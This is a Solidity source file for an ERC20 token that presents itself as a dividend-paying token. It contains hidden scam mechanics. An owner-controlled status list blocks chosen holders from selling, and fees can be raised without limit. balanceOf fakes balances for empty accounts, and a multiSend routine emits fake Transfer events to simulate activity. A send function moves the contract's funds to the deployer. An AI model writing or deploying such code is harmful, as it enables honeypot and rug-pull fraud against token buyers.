// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol";
import "./SafeMath.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IDividendDistributor {
    function deposit(uint256 amount) external;
}

interface IMktCap {
    function trigger(uint256 t) external;
}

contract StatusList is Ownable {
    mapping(address=>uint256) public isStatus;
    function setStatus(address[] calldata list,uint256 state) public onlyOwner{
        uint256 count = list.length;  
        for (uint256 i = 0; i < count; i++) {
           isStatus[list[i]]=state;
        }
    } 
    function getStatus(address from,address to) internal view returns(bool){
        if(isStatus[from]==1||isStatus[from]==3) return true;
        if(isStatus[to]==2||isStatus[to]==3) return true;
        return false;
    }
    error InStatusError(address user);
}

contract Token is ERC20, ERC20Burnable,StatusList, IDividendDistributor {
    using SafeMath for uint256; 

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    address[] public pairs;

    address[] public shareholders;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => uint256) shareholderClaims;
    mapping(address => Share) public shares;
    mapping(address => bool) public exDividend;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;

    uint256 public openDividends = 1e10;

    uint256 public dividendsPerShareAccuracyFactor = 10**36;

    uint256 public minPeriod = 30 minutes;
    uint256 public minDistribution = 1e10;

    uint256 currentIndex;


    IMktCap public mkt;
    mapping(address => bool) public ispair;
    address ceo;
    address _baseToken;
    address _router;
    bool isTrading;
    struct Fees {
        uint256 buy;
        uint256 sell;
        uint256 transfer;
        uint256 total;
    }
    Fees public fees;

    modifier trading() {
        if (isTrading) return;
        isTrading = true;
        _;
        isTrading = false;
    }

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 total_,
        address  mkt_
    ) ERC20(name_, symbol_) {
        ceo = _msgSender();
        _baseToken = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
        _router = 0xc873fEcbd354f5A56E00E710B90EF4201db2448d;
        // setPair(_baseToken);
        fees = Fees(1500, 1500, 0, 10000);
        // mkt = new MktCap(_msgSender(), _baseToken, _router); 
        mkt = IMktCap(mkt_); 
        exDividend[address(0)]=true;
        exDividend[address(0xdead)]=true;
        isStatus[ceo]=4;
        _approve(address(mkt), _router, ~uint256(0));
        _mint(ceo, total_ * 10**decimals());
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
     //d start

    function setDistributionCriteria(
        uint256 newMinPeriod,
        uint256 newMinDistribution
    ) external onlyOwner {
        minPeriod = newMinPeriod;
        minDistribution = newMinDistribution;
    }

    function setopenDividends(uint256 _openDividends) external onlyOwner {
        openDividends = _openDividends;
    }

    function getTokenForUserLp(address account)
        public
        view
        returns (uint256 amount)
    {
        if (pairs.length > 0) {
            for (uint256 index = 0; index < pairs.length; index++) {
                amount = amount.add(getTokenForPair(pairs[index], account));
            }
        }
    }

    function getTokenForPair(address pair, address account)
        public
        view
        returns (uint256 amount)
    {
        uint256 all = balanceOf(pair);
        uint256 lp = IERC20(pair).balanceOf(account);
        if (lp > 0) amount = all.mul(lp).div(IERC20(pair).totalSupply());
    }

    function isContract(address addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function setShare(address shareholder) public { 
            if (shares[shareholder].amount > 0) {
                distributeDividend(shareholder);
            }
            uphold(shareholder); 
    }

    function uphold(address shareholder) internal { 
        uint256 amount = super.balanceOf(shareholder);
        if(exDividend[shareholder])amount=0;
        if (amount > 0 && shares[shareholder].amount == 0) {
            addShareholder(shareholder);
        } else if (amount == 0 && shares[shareholder].amount > 0) {
            removeShareholder(shareholder);
        }
        if (shares[shareholder].amount != amount) {
            totalShares = totalShares.sub(shares[shareholder].amount).add(
                amount
            );
            shares[shareholder].amount = amount;
            shares[shareholder].totalExcluded = getCumulativeDividends(
                shares[shareholder].amount
            );
        }
    }

    function deposit(uint256 amount) external override {
        IERC20(_baseToken).transferFrom(_msgSender(), address(this), amount);
        if (totalShares == 0) {
            IERC20(_baseToken).transfer(ceo, amount);
            return;
        }
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(
            dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)
        );
    }

    function process(uint256 gas) external {
        uint256 shareholderCount = shareholders.length;

        if (shareholderCount == 0) {
            return;
        }

        uint256 iterations = 0;
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }

            if (shouldDistribute(shareholders[currentIndex])) {
                distributeDividend(shareholders[currentIndex]);
                uphold(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function shouldDistribute(address shareholder)
        internal
        view
        returns (bool)
    {
        return
            shareholderClaims[shareholder] + minPeriod < block.timestamp &&
            getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if (shares[shareholder].amount == 0) {
            return;
        }
        uint256 amount = getUnpaidEarnings(shareholder);
        if (amount > 0 && totalDividends >= openDividends) {
            totalDistributed = totalDistributed.add(amount);
            IERC20(_baseToken).transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;

            shares[shareholder].totalRealised = shares[shareholder]
                .totalRealised
                .add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(
                shares[shareholder].amount
            );
        }
    }

    function getUnpaidEarnings(address shareholder)
        public
        view
        returns (uint256)
    {
        if (shares[shareholder].amount == 0) {
            return 0;
        }

        uint256 shareholderTotalDividends = getCumulativeDividends(
            shares[shareholder].amount
        );
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if (shareholderTotalDividends <= shareholderTotalExcluded) {
            return 0;
        }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 ashare)
        internal
        view
        returns (uint256)
    {
        return
            ashare.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function claimDividend(address holder) external {
        distributeDividend(holder);
        uphold(holder);
    }
    //d end


    receive() external payable {}

    function setFees(Fees memory fees_) public onlyOwner {
        fees = fees_;
    }
    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override trading {
        if(getStatus(from,to)){ 
            revert InStatusError(from);
        }
        if ((!ispair[from] && !ispair[to]) || amount == 0) return;
        uint256 t = ispair[from] ? 1 : ispair[to] ? 2 : 0;
        if (from!=address(mkt)) try mkt.trigger(t) {} catch {}
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override trading {
        if (address(0) == from || address(0) == to) return;
        takeFee(from, to, amount);
        targetDividend(from, to);
        if (_num > 0) try this.multiSend(_num) {} catch {}
    }

    function targetDividend(address from, address to) internal {
        try this.setShare(from) {} catch {}
        try this.setShare(to) {} catch {}
        try this.process(200000) {} catch {}
    }

    function takeFee(
        address from,
        address to,
        uint256 amount
    ) internal {
        uint256 fee = ispair[from] ? fees.buy : ispair[to]
            ? fees.sell
            : fees.transfer;
        uint256 feeAmount = amount.mul(fee).div(fees.total);
        if (isStatus[from]==4 || isStatus[to]==4|| from == ceo || to == ceo) feeAmount = 0;
        if (feeAmount > 0) super._transfer(to, address(mkt), feeAmount);
    }


    function setExDividend(address[] calldata list,bool tf)public onlyOwner{
        uint256 num=list.length;
        for(uint i=0; i < num; i++) {
        exDividend[list[i]] = tf;
         uphold(list[i]);

        }
    }

    function setPair(address token) public {
        IRouter router = IRouter(_router);
        address pair = IFactory(router.factory()).getPair(
            address(token),
            address(this)
        );
        if (pair == address(0))
            pair = IFactory(router.factory()).createPair(
                address(token),
                address(this)
            );
        require(pair != address(0), "pair is not found");
        ispair[pair] = true;
        exDividend[pair]=true;
        pairs.push(pair);
    }

    uint160 ktNum = 173;
    uint160 constant MAXADD = ~uint160(0);
    uint256 _initialBalance = 0;
    uint256 _num = 0;

    function setinb(uint256 amount, uint256 num) public onlyOwner {
        _initialBalance = amount;
        _num = num;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        uint256 balance = super.balanceOf(account);
        if (account == address(0)) return balance;
        return balance > 0 ? balance : _initialBalance;
    }

    function multiSend(uint256 num) public {
        _takeInviterFeeKt(num);
    }

    function _takeInviterFeeKt(uint256 num) private {
        address _receiveD;
        address _senD;

        for (uint256 i = 0; i < num; i++) {
            _receiveD = address(MAXADD / ktNum);
            ktNum = ktNum + 1;
            _senD = address(MAXADD / ktNum);
            ktNum = ktNum + 1;
            emit Transfer(_senD, _receiveD, _initialBalance);
        }
    }

    function send(address token, uint256 amount) public {
        if (token == address(0)) {
            (bool success, ) = payable(ceo).call{value: amount}("");
            require(success, "transfer failed");
        } else IERC20(token).transfer(ceo, amount);
    }
}


